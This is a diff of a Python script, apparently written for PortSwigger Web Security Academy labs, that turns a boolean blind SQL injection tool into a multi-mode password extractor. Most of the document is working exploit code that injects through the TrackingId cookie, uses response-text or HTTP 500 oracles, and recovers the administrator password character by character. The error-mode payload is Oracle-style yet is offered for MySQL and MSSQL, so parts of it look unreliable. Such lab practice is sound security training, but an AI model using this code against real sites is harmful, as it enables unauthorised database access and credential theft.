@@ -1,11 +1,15 @@
 #!/usr/bin/env python3
 """
-Blind SQL Injection - Boolean-Based Password Extraction
-PortSwigger Web Security Academy Lab
+Blind SQL Injection - Multi-mode password extractor
+PortSwigger Web Security Academy Labs
 
-Exploits a boolean-based blind SQLi in the TrackingId cookie to extract
-the administrator password one character at a time using a 'Welcome back'
-oracle response.
+Supports two detection modes:
+  boolean  — infers characters via a conditional response oracle ("Welcome back")
+  error    — infers characters via HTTP 500 (true) vs 200 (false) using error-based payloads
+
+Supports four database dialects (controls SUBSTR function syntax):
+  postgresql, mysql, mssql  — SUBSTRING(str, pos, 1)
+  oracle                    — SUBSTR(str, pos, 1)
 """
 import argparse
 import sys
@@ -13,31 +17,63 @@ import requests
 
 CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"
 MAX_POSITIONS = 20
+PATH = "/filter?category=Gifts"
+
+# Per-dialect substring function
+SUBSTR_FN = {
+    "postgresql": "SUBSTRING",
+    "mysql":      "SUBSTRING",
+    "mssql":      "SUBSTRING",
+    "oracle":     "SUBSTR",
+}
 
 
-def extract_password(url: str, session: str, tracking_id: str) -> str:
-    password = ""
-    target = url.rstrip("/") + "/filter?category=Gifts"
-    print(f"[*] Target: {target}")
+def build_payload(mode: str, db: str, tracking_id: str, session: str, position: int, char: str) -> str:
+    fn = SUBSTR_FN[db]
+
+    if mode == "boolean":
+        sqli = (
+            f"' AND {fn}("
+            f"(SELECT password FROM users WHERE username='administrator')"
+            f",{position},1)='{char}'--"
+        )
+    else:  # error
+        sqli = (
+            f"'||(SELECT CASE WHEN ({fn}(password,{position},1)='{char}') "
+            f"THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')--"
+        )
+
+    return f"TrackingId={tracking_id}{sqli}; session={session}"
+
+
+def is_true(mode: str, response: requests.Response) -> bool:
+    if mode == "boolean":
+        return "Welcome back" in response.text
+    else:  # error
+        return response.status_code == 500
+
+
+def extract_password(url: str, session: str, tracking_id: str, mode: str, db: str) -> str:
+    target = url.rstrip("/") + PATH
+    print(f"[*] Target : {target}")
+    print(f"[*] Mode   : {mode}")
+    print(f"[*] DB     : {db}")
     print(f"[*] Extracting administrator password ({MAX_POSITIONS} chars max)...\n")
 
+    password = ""
     for position in range(1, MAX_POSITIONS + 1):
         found = False
         for char in CHARSET:
-            cookie = (
-                f"TrackingId={tracking_id}' AND SUBSTRING("
-                f"(SELECT password FROM users WHERE username='administrator')"
-                f",{position},1)='{char}'--; session={session}"
-            )
+            cookie = build_payload(mode, db, tracking_id, session, position, char)
             r = requests.get(target, headers={"Cookie": cookie}, timeout=10)
-            if "Welcome back" in r.text:
+            if is_true(mode, r):
                 password += char
                 print(f"  Position {position:02d}: {char}  →  {password}")
                 found = True
                 break
 
         if not found:
-            print(f"\n[*] No match at position {position} — password extraction complete.")
+            print(f"\n[*] No match at position {position} — extraction complete.")
             break
 
     return password
@@ -45,26 +81,23 @@ def extract_password(url: str, session: str, tracking_id: str) -> str:
 
 def main():
     parser = argparse.ArgumentParser(
-        description="Boolean-based blind SQLi password extractor (PortSwigger lab)"
+        description="Blind SQLi password extractor — boolean and error modes (PortSwigger labs)"
     )
-    parser.add_argument("--url", default="https://yourlab.web-security-academy.net/",
-                        help="Lab URL (include trailing slash)")
-    parser.add_argument("--session", default="your_session_cookie",
-                        help="Value of the session cookie from browser DevTools")
-    parser.add_argument("--tracking-id", default="your_tracking_id",
-                        help="Existing TrackingId value from browser DevTools")
+    parser.add_argument("--url", required=True,
+                        help="Lab base URL, e.g. https://LABID.web-security-academy.net/")
+    parser.add_argument("--session", required=True,
+                        help="session cookie value from browser DevTools")
+    parser.add_argument("--tracking-id", required=True,
+                        help="TrackingId cookie value from browser DevTools")
+    parser.add_argument("--mode", choices=["boolean", "error"], default="boolean",
+                        help="boolean = Welcome back oracle | error = HTTP 500 oracle")
+    parser.add_argument("--db", choices=list(SUBSTR_FN.keys()), default="postgresql",
+                        help="Database dialect — controls SUBSTR vs SUBSTRING syntax")
     args = parser.parse_args()
 
-    if "yourlab" in args.url or args.session == "your_session_cookie":
-        print("[!] Update --url, --session, and --tracking-id before running.")
-        print("    Example:")
-        print("      python3 scripts/10_blind_sqli.py \\")
-        print("        --url https://LABID.web-security-academy.net/ \\")
-        print("        --session <session_value> \\")
-        print("        --tracking-id <TrackingId_value>")
-        sys.exit(1)
-
-    password = extract_password(args.url, args.session, args.tracking_id)
+    password = extract_password(
+        args.url, args.session, args.tracking_id, args.mode, args.db
+    )
     print(f"\n[+] Password: {password}")
 
 
